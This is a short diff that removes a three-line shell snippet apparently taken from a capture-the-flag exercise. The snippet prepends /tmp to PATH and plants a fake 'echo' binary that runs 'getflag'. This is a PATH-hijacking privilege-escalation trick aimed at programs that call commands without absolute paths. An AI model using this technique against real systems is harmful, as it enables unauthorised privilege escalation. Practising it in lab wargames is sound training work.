@@ -1,3 +1,0 @@
-export PATH=/tmp:$PATH
-echo "/bin/sh -c getflag" > /tmp/echo
-chmod 755 /tmp/echo 
